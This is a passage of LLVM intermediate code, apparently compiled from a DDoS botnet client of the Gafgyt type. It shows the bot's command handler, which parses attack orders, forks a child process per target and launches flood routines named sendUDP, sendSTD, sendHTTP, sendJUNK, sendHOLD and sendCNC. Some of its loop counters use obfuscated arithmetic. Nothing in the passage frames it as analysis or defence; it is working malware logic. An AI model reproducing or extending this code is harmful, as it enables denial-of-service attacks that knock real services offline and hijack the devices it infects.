  br i1 %165, label %170, label %166

; <label>:166:                                    ; preds = %163
  %167 = load i8*, i8** %10, align 8
  %168 = load i32, i32* %8, align 4
  %169 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %167, i32 %168, i32 %169)
  call void @_exit(i32 0) #12
  unreachable

; <label>:170:                                    ; preds = %163
  %171 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %171, i8** %10, align 8
  br label %160

; <label>:172:                                    ; preds = %160
  br label %181

; <label>:173:                                    ; preds = %142
  %174 = call i32 @listFork()
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %173
  br label %828

; <label>:177:                                    ; preds = %173
  %178 = load i8*, i8** %7, align 8
  %179 = load i32, i32* %8, align 4
  %180 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %178, i32 %179, i32 %180)
  call void @_exit(i32 0) #12
  unreachable

; <label>:181:                                    ; preds = %172
  br label %182

; <label>:182:                                    ; preds = %181, %120
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 0
  %185 = load i8*, i8** %184, align 8
  %186 = call i32 @strcmp(i8* %185, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0)) #10
  %187 = icmp ne i32 %186, 0
  br i1 %187, label %246, label %188

; <label>:188:                                    ; preds = %182
  %189 = load i32, i32* %3, align 4
  %190 = icmp slt i32 %189, 4
  br i1 %190, label %203, label %191

; <label>:191:                                    ; preds = %188
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  %196 = icmp slt i32 %195, 1
  br i1 %196, label %203, label %197

; <label>:197:                                    ; preds = %191
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 3
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #10
  %202 = icmp slt i32 %201, 1
  br i1 %202, label %203, label %204

; <label>:203:                                    ; preds = %197, %191, %188
  br label %828

; <label>:204:                                    ; preds = %197
  %205 = load i8**, i8*** %4, align 8
  %206 = getelementptr inbounds i8*, i8** %205, i64 1
  %207 = load i8*, i8** %206, align 8
  store i8* %207, i8** %11, align 8
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = call i32 @atoi(i8* %210) #10
  store i32 %211, i32* %12, align 4
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 3
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* %214) #10
  store i32 %215, i32* %13, align 4
  %216 = load i8*, i8** %11, align 8
  %217 = call i8* @strstr(i8* %216, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %218 = icmp ne i8* %217, null
  br i1 %218, label %219, label %237

; <label>:219:                                    ; preds = %204
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %221, i8** %14, align 8
  br label %222

; <label>:222:                                    ; preds = %234, %219
  %223 = load i8*, i8** %14, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %236

; <label>:225:                                    ; preds = %222
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %234, label %228

; <label>:228:                                    ; preds = %225
  %229 = load i8*, i8** %14, align 8
  %230 = load i32, i32* %12, align 4
  %231 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %229, i32 %230, i32 %231)
  %232 = load i32, i32* @mainCommSock, align 4
  %233 = call i32 @close(i32 %232)
  call void @_exit(i32 0) #12
  unreachable

; <label>:234:                                    ; preds = %225
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %235, i8** %14, align 8
  br label %222

; <label>:236:                                    ; preds = %222
  br label %245

; <label>:237:                                    ; preds = %204
  %238 = call i32 @listFork()
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %237
  br label %828

; <label>:241:                                    ; preds = %237
  %242 = load i8*, i8** %11, align 8
  %243 = load i32, i32* %12, align 4
  %244 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %242, i32 %243, i32 %244)
  call void @_exit(i32 0) #12
  unreachable

; <label>:245:                                    ; preds = %236
  br label %246

; <label>:246:                                    ; preds = %245, %182
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 0
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @strcmp(i8* %249, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %365, label %252

; <label>:252:                                    ; preds = %246
  %253 = load i32, i32* %3, align 4
  %254 = icmp slt i32 %253, 6
  br i1 %254, label %300, label %255

; <label>:255:                                    ; preds = %252
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 3
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #10
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %300, label %261

; <label>:261:                                    ; preds = %255
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 2
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #10
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %300, label %267

; <label>:267:                                    ; preds = %261
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 4
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #10
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %300, label %273

; <label>:273:                                    ; preds = %267
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 5
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %300, label %279

; <label>:279:                                    ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 5
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  %284 = icmp sgt i32 %283, 65500
  br i1 %284, label %300, label %285

; <label>:285:                                    ; preds = %279
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 4
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #10
  %290 = icmp sgt i32 %289, 32
  br i1 %290, label %300, label %291

; <label>:291:                                    ; preds = %285
  %292 = load i32, i32* %3, align 4
  %293 = icmp eq i32 %292, 7
  br i1 %293, label %294, label %301

; <label>:294:                                    ; preds = %291
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 6
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #10
  %299 = icmp slt i32 %298, 1
  br i1 %299, label %300, label %301

; <label>:300:                                    ; preds = %294, %285, %279, %273, %267, %261, %255, %252
  br label %828

; <label>:301:                                    ; preds = %294, %291
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 1
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %15, align 8
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 2
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  store i32 %308, i32* %16, align 4
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 3
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* %311) #10
  store i32 %312, i32* %17, align 4
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 4
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* %315) #10
  store i32 %316, i32* %18, align 4
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 5
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @atoi(i8* %319) #10
  store i32 %320, i32* %19, align 4
  %321 = load i32, i32* %3, align 4
  %322 = icmp eq i32 %321, 7
  br i1 %322, label %323, label %328

; <label>:323:                                    ; preds = %301
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 6
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #10
  br label %329

; <label>:328:                                    ; preds = %301
  br label %329

; <label>:329:                                    ; preds = %328, %323
  %330 = phi i32 [ %327, %323 ], [ 10, %328 ]
  store i32 %330, i32* %20, align 4
  %331 = load i8*, i8** %15, align 8
  %332 = call i8* @strstr(i8* %331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %333 = icmp ne i8* %332, null
  br i1 %333, label %334, label %353

; <label>:334:                                    ; preds = %329
  %335 = load i8*, i8** %15, align 8
  %336 = call i8* @strtok(i8* %335, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %336, i8** %21, align 8
  br label %337

; <label>:337:                                    ; preds = %350, %334
  %338 = load i8*, i8** %21, align 8
  %339 = icmp ne i8* %338, null
  br i1 %339, label %340, label %352

; <label>:340:                                    ; preds = %337
  %341 = call i32 @listFork()
  %342 = icmp ne i32 %341, 0
  br i1 %342, label %350, label %343

; <label>:343:                                    ; preds = %340
  %344 = load i8*, i8** %21, align 8
  %345 = load i32, i32* %16, align 4
  %346 = load i32, i32* %17, align 4
  %347 = load i32, i32* %18, align 4
  %348 = load i32, i32* %19, align 4
  %349 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %344, i32 %345, i32 %346, i32 %347, i32 %348, i32 %349)
  call void @_exit(i32 0) #12
  unreachable

; <label>:350:                                    ; preds = %340
  %351 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %351, i8** %21, align 8
  br label %337

; <label>:352:                                    ; preds = %337
  br label %364

; <label>:353:                                    ; preds = %329
  %354 = call i32 @listFork()
  %355 = icmp ne i32 %354, 0
  br i1 %355, label %356, label %357

; <label>:356:                                    ; preds = %353
  br label %828

; <label>:357:                                    ; preds = %353
  %358 = load i8*, i8** %15, align 8
  %359 = load i32, i32* %16, align 4
  %360 = load i32, i32* %17, align 4
  %361 = load i32, i32* %18, align 4
  %362 = load i32, i32* %19, align 4
  %363 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %358, i32 %359, i32 %360, i32 %361, i32 %362, i32 %363)
  call void @_exit(i32 0) #12
  unreachable

; <label>:364:                                    ; preds = %352
  br label %365

; <label>:365:                                    ; preds = %364, %246
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 0
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @strcmp(i8* %368, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %427, label %371

; <label>:371:                                    ; preds = %365
  %372 = load i32, i32* %3, align 4
  %373 = icmp slt i32 %372, 4
  br i1 %373, label %386, label %374

; <label>:374:                                    ; preds = %371
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 2
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* %377) #10
  %379 = icmp slt i32 %378, 1
  br i1 %379, label %386, label %380

; <label>:380:                                    ; preds = %374
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 3
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #10
  %385 = icmp slt i32 %384, 1
  br i1 %385, label %386, label %387

; <label>:386:                                    ; preds = %380, %374, %371
  br label %828

; <label>:387:                                    ; preds = %380
  %388 = load i8**, i8*** %4, align 8
  %389 = getelementptr inbounds i8*, i8** %388, i64 1
  %390 = load i8*, i8** %389, align 8
  store i8* %390, i8** %22, align 8
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 2
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  store i32 %394, i32* %23, align 4
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 3
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #10
  store i32 %398, i32* %24, align 4
  %399 = load i8*, i8** %22, align 8
  %400 = call i8* @strstr(i8* %399, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %401 = icmp ne i8* %400, null
  br i1 %401, label %402, label %418

; <label>:402:                                    ; preds = %387
  %403 = load i8*, i8** %22, align 8
  %404 = call i8* @strtok(i8* %403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %404, i8** %25, align 8
  br label %405

; <label>:405:                                    ; preds = %415, %402
  %406 = load i8*, i8** %25, align 8
  %407 = icmp ne i8* %406, null
  br i1 %407, label %408, label %417

; <label>:408:                                    ; preds = %405
  %409 = call i32 @listFork()
  %410 = icmp ne i32 %409, 0
  br i1 %410, label %415, label %411

; <label>:411:                                    ; preds = %408
  %412 = load i8*, i8** %25, align 8
  %413 = load i32, i32* %23, align 4
  %414 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %412, i32 %413, i32 %414)
  call void @_exit(i32 0) #12
  unreachable

; <label>:415:                                    ; preds = %408
  %416 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %416, i8** %25, align 8
  br label %405

; <label>:417:                                    ; preds = %405
  br label %426

; <label>:418:                                    ; preds = %387
  %419 = call i32 @listFork()
  %420 = icmp ne i32 %419, 0
  br i1 %420, label %421, label %422

; <label>:421:                                    ; preds = %418
  br label %828

; <label>:422:                                    ; preds = %418
  %423 = load i8*, i8** %22, align 8
  %424 = load i32, i32* %23, align 4
  %425 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %423, i32 %424, i32 %425)
  call void @_exit(i32 0) #12
  unreachable

; <label>:426:                                    ; preds = %417
  br label %427

; <label>:427:                                    ; preds = %426, %365
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 0
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @strcmp(i8* %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i32 0, i32 0)) #10
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %502, label %433

; <label>:433:                                    ; preds = %427
  %434 = load i32, i32* %3, align 4
  %435 = icmp slt i32 %434, 3
  br i1 %435, label %442, label %436

; <label>:436:                                    ; preds = %433
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 2
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #10
  %441 = icmp slt i32 %440, 1
  br i1 %441, label %442, label %443

; <label>:442:                                    ; preds = %436, %433
  br label %828

; <label>:443:                                    ; preds = %436
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  %446 = load i8*, i8** %445, align 8
  store i8* %446, i8** %26, align 8
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #10
  store i32 %450, i32* %27, align 4
  %451 = load i8*, i8** %26, align 8
  %452 = call i8* @strstr(i8* %451, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %453 = icmp ne i8* %452, null
  br i1 %453, label %454, label %482

; <label>:454:                                    ; preds = %443
  %455 = load i8*, i8** %26, align 8
  %456 = call i8* @strtok(i8* %455, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %456, i8** %28, align 8
  br label %457

; <label>:457:                                    ; preds = %479, %454
  %458 = load i8*, i8** %28, align 8
  %459 = icmp ne i8* %458, null
  br i1 %459, label %460, label %481

; <label>:460:                                    ; preds = %457
  %461 = call i32 @listFork()
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %479, label %463

; <label>:463:                                    ; preds = %460
  store i32 0, i32* %29, align 4
  br label %464

; <label>:464:                                    ; preds = %467, %463
  %465 = load i32, i32* %29, align 4
  %466 = icmp slt i32 %465, 10
  br i1 %466, label %467, label %476

; <label>:467:                                    ; preds = %464
  %468 = load i8*, i8** %26, align 8
  %469 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %468, i32 %469)
  %470 = load i32, i32* %29, align 4
  %471 = sub i32 0, %470
  %472 = sub i32 0, 1
  %473 = add i32 %471, %472
  %474 = sub i32 0, %473
  %475 = add nsw i32 %470, 1
  store i32 %474, i32* %29, align 4
  br label %464

; <label>:476:                                    ; preds = %464
  %477 = load i32, i32* @mainCommSock, align 4
  %478 = call i32 @close(i32 %477)
  call void @_exit(i32 0) #12
  unreachable

; <label>:479:                                    ; preds = %460
  %480 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %480, i8** %28, align 8
  br label %457

; <label>:481:                                    ; preds = %457
  br label %501

; <label>:482:                                    ; preds = %443
  %483 = call i32 @listFork()
  %484 = icmp ne i32 %483, 0
  br i1 %484, label %485, label %486

; <label>:485:                                    ; preds = %482
  br label %828

; <label>:486:                                    ; preds = %482
  store i32 0, i32* %30, align 4
  br label %487

; <label>:487:                                    ; preds = %490, %486
  %488 = load i32, i32* %30, align 4
  %489 = icmp slt i32 %488, 10
  br i1 %489, label %490, label %498

; <label>:490:                                    ; preds = %487
  %491 = load i8*, i8** %26, align 8
  %492 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %491, i32 %492)
  %493 = load i32, i32* %30, align 4
  %494 = add i32 %493, 1569277723
  %495 = add i32 %494, 1
  %496 = sub i32 %495, 1569277723
  %497 = add nsw i32 %493, 1
  store i32 %496, i32* %30, align 4
  br label %487

; <label>:498:                                    ; preds = %487
  %499 = load i32, i32* @mainCommSock, align 4
  %500 = call i32 @close(i32 %499)
  call void @_exit(i32 0) #12
  unreachable

; <label>:501:                                    ; preds = %481
  br label %502

; <label>:502:                                    ; preds = %501, %427
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 0
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @strcmp(i8* %505, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %507 = icmp ne i32 %506, 0
  br i1 %507, label %566, label %508

; <label>:508:                                    ; preds = %502
  %509 = load i32, i32* %3, align 4
  %510 = icmp slt i32 %509, 4
  br i1 %510, label %523, label %511

; <label>:511:                                    ; preds = %508
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 2
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @atoi(i8* %514) #10
  %516 = icmp slt i32 %515, 1
  br i1 %516, label %523, label %517

; <label>:517:                                    ; preds = %511
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 3
  %520 = load i8*, i8** %519, align 8
  %521 = call i32 @atoi(i8* %520) #10
  %522 = icmp slt i32 %521, 1
  br i1 %522, label %523, label %524

; <label>:523:                                    ; preds = %517, %511, %508
  br label %828

; <label>:524:                                    ; preds = %517
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 1
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %31, align 8
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #10
  store i32 %531, i32* %32, align 4
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 3
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  store i32 %535, i32* %33, align 4
  %536 = load i8*, i8** %31, align 8
  %537 = call i8* @strstr(i8* %536, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %538 = icmp ne i8* %537, null
  br i1 %538, label %539, label %557

; <label>:539:                                    ; preds = %524
  %540 = load i8*, i8** %31, align 8
  %541 = call i8* @strtok(i8* %540, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %541, i8** %34, align 8
  br label %542

; <label>:542:                                    ; preds = %554, %539
  %543 = load i8*, i8** %34, align 8
  %544 = icmp ne i8* %543, null
  br i1 %544, label %545, label %556

; <label>:545:                                    ; preds = %542
  %546 = call i32 @listFork()
  %547 = icmp ne i32 %546, 0
  br i1 %547, label %554, label %548

; <label>:548:                                    ; preds = %545
  %549 = load i8*, i8** %34, align 8
  %550 = load i32, i32* %32, align 4
  %551 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %549, i32 %550, i32 %551)
  %552 = load i32, i32* @mainCommSock, align 4
  %553 = call i32 @close(i32 %552)
  call void @_exit(i32 0) #12
  unreachable

; <label>:554:                                    ; preds = %545
  %555 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %555, i8** %34, align 8
  br label %542

; <label>:556:                                    ; preds = %542
  br label %565

; <label>:557:                                    ; preds = %524
  %558 = call i32 @listFork()
  %559 = icmp ne i32 %558, 0
  br i1 %559, label %560, label %561

; <label>:560:                                    ; preds = %557
  br label %828

; <label>:561:                                    ; preds = %557
  %562 = load i8*, i8** %31, align 8
  %563 = load i32, i32* %32, align 4
  %564 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %562, i32 %563, i32 %564)
  call void @_exit(i32 0) #12
  unreachable

; <label>:565:                                    ; preds = %556
  br label %566

; <label>:566:                                    ; preds = %565, %502
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 0
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @strcmp(i8* %569, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0)) #10
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %636, label %572

; <label>:572:                                    ; preds = %566
  %573 = load i32, i32* %3, align 4
  %574 = icmp slt i32 %573, 4
  br i1 %574, label %587, label %575

; <label>:575:                                    ; preds = %572
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 2
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @atoi(i8* %578) #10
  %580 = icmp slt i32 %579, 1
  br i1 %580, label %587, label %581

; <label>:581:                                    ; preds = %575
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 3
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  %586 = icmp slt i32 %585, 1
  br i1 %586, label %587, label %588

; <label>:587:                                    ; preds = %581, %575, %572
  br label %828

; <label>:588:                                    ; preds = %581
  %589 = load i8**, i8*** %4, align 8
  %590 = getelementptr inbounds i8*, i8** %589, i64 1
  %591 = load i8*, i8** %590, align 8
  store i8* %591, i8** %35, align 8
  %592 = load i8**, i8*** %4, align 8
  %593 = getelementptr inbounds i8*, i8** %592, i64 2
  %594 = load i8*, i8** %593, align 8
  %595 = call i32 @atoi(i8* %594) #10
  store i32 %595, i32* %36, align 4
  %596 = load i8**, i8*** %4, align 8
  %597 = getelementptr inbounds i8*, i8** %596, i64 3
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 @atoi(i8* %598) #10
  store i32 %599, i32* %37, align 4
  %600 = load i8*, i8** %35, align 8
  %601 = call i8* @strstr(i8* %600, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %602 = icmp ne i8* %601, null
  br i1 %602, label %603, label %624

; <label>:603:                                    ; preds = %588
  %604 = load i8*, i8** %35, align 8
  %605 = call i8* @strtok(i8* %604, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %605, i8** %38, align 8
  br label %606

; <label>:606:                                    ; preds = %621, %603
  %607 = load i8*, i8** %38, align 8
  %608 = icmp ne i8* %607, null
  br i1 %608, label %609, label %623

; <label>:609:                                    ; preds = %606
  %610 = call i32 @listFork()
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %621, label %612

; <label>:612:                                    ; preds = %609
  %613 = load i8*, i8** %38, align 8
  %614 = load i32, i32* %36, align 4
  %615 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %613, i32 %614, i32 %615)
  %616 = load i8*, i8** %38, align 8
  %617 = load i32, i32* %36, align 4
  %618 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %616, i32 %617, i32 %618)
  %619 = load i32, i32* @mainCommSock, align 4
  %620 = call i32 @close(i32 %619)
  call void @_exit(i32 0) #12
  unreachable

; <label>:621:                                    ; preds = %609
  %622 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %622, i8** %38, align 8
  br label %606

; <label>:623:                                    ; preds = %606
  br label %635

; <label>:624:                                    ; preds = %588
  %625 = call i32 @listFork()
  %626 = icmp ne i32 %625, 0
  br i1 %626, label %627, label %628

; <label>:627:                                    ; preds = %624
  br label %828

; <label>:628:                                    ; preds = %624
  %629 = load i8*, i8** %35, align 8
  %630 = load i32, i32* %36, align 4
  %631 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %629, i32 %630, i32 %631)
  %632 = load i8*, i8** %35, align 8
  %633 = load i32, i32* %36, align 4
  %634 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %632, i32 %633, i32 %634)
  call void @_exit(i32 0) #12
  unreachable

; <label>:635:                                    ; preds = %623
  br label %636

; <label>:636:                                    ; preds = %635, %566
  %637 = load i8**, i8*** %4, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 0
  %639 = load i8*, i8** %638, align 8
  %640 = call i32 @strcmp(i8* %639, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %641 = icmp ne i32 %640, 0
  br i1 %641, label %763, label %642

; <label>:642:                                    ; preds = %636
  %643 = load i32, i32* %3, align 4
  %644 = icmp slt i32 %643, 6
  br i1 %644, label %687, label %645

; <label>:645:                                    ; preds = %642
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 3
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  %650 = icmp eq i32 %649, -1
  br i1 %650, label %687, label %651

; <label>:651:                                    ; preds = %645
  %652 = load i8**, i8*** %4, align 8
  %653 = getelementptr inbounds i8*, i8** %652, i64 2
  %654 = load i8*, i8** %653, align 8
  %655 = call i32 @atoi(i8* %654) #10
  %656 = icmp eq i32 %655, -1
  br i1 %656, label %687, label %657

; <label>:657:                                    ; preds = %651
  %658 = load i8**, i8*** %4, align 8
  %659 = getelementptr inbounds i8*, i8** %658, i64 4
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 @atoi(i8* %660) #10
  %662 = icmp eq i32 %661, -1
  br i1 %662, label %687, label %663

; <label>:663:                                    ; preds = %657
  %664 = load i8**, i8*** %4, align 8
  %665 = getelementptr inbounds i8*, i8** %664, i64 4
  %666 = load i8*, i8** %665, align 8
  %667 = call i32 @atoi(i8* %666) #10
  %668 = icmp sgt i32 %667, 32
  br i1 %668, label %687, label %669

; <label>:669:                                    ; preds = %663
  %670 = load i32, i32* %3, align 4
  %671 = icmp sgt i32 %670, 6
  br i1 %671, label %672, label %678

; <label>:672:                                    ; preds = %669
  %673 = load i8**, i8*** %4, align 8
  %674 = getelementptr inbounds i8*, i8** %673, i64 6
  %675 = load i8*, i8** %674, align 8
  %676 = call i32 @atoi(i8* %675) #10
  %677 = icmp slt i32 %676, 0
  br i1 %677, label %687, label %678

; <label>:678:                                    ; preds = %672, %669
  %679 = load i32, i32* %3, align 4
  %680 = icmp eq i32 %679, 8
  br i1 %680, label %681, label %688

; <label>:681:                                    ; preds = %678
  %682 = load i8**, i8*** %4, align 8
  %683 = getelementptr inbounds i8*, i8** %682, i64 7
  %684 = load i8*, i8** %683, align 8
  %685 = call i32 @atoi(i8* %684) #10
  %686 = icmp slt i32 %685, 1
  br i1 %686, label %687, label %688

; <label>:687:                                    ; preds = %681, %672, %663, %657, %651, %645, %642
  br label %828

; <label>:688:                                    ; preds = %681, %678
  %689 = load i8**, i8*** %4, align 8
  %690 = getelementptr inbounds i8*, i8** %689, i64 1
  %691 = load i8*, i8** %690, align 8
  store i8* %691, i8** %39, align 8
  %692 = load i8**, i8*** %4, align 8
  %693 = getelementptr inbounds i8*, i8** %692, i64 2
  %694 = load i8*, i8** %693, align 8
  %695 = call i32 @atoi(i8* %694) #10
